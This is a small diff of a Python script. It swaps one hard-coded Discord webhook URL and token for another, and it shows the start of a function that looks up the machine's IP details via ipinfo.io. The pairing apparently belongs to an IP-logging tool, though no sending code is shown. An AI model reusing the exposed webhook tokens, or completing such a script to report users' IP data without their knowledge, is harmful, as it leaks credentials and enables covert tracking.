@@ -4,7 +4,7 @@ import time
 import requests
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-webhook = "https://discord.com/api/webhooks/842268179287375892/SIS9ZsBiTp64FSrupB8vhEqxEVY7qp-ykI1aKYXUd8Yn6fDPpEMXtMf1t-e65hVBd4E6"
+webhook = "https://discord.com/api/webhooks/1084682736926736545/r0NCZ6LCXhKmEtIVM6jn99YXm5lm9fPBW15xDSGo-XF-GWdCMsGB913oj7XVQ54-1eey"
 
 def get_ip_information():
     request = requests.get("http://ipinfo.io/json")
